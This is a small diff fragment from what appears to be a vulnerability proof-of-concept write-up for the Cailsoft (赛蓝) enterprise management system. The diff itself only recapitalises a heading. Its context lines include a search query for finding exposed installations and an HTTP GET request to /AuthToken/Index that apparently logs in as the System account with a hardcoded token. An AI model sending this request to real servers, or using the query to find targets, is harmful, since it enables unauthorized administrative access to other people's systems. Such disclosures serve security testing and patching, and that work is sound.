@@ -8,7 +8,7 @@
 body="www.cailsoft.com" || body="赛蓝企业管理系统"
 ```
 
-## poc
+## POC
 
 ```
 GET /AuthToken/Index?loginName=System&token=c94ad0c0aee8b1f23b138484f014131f HTTP/1.1
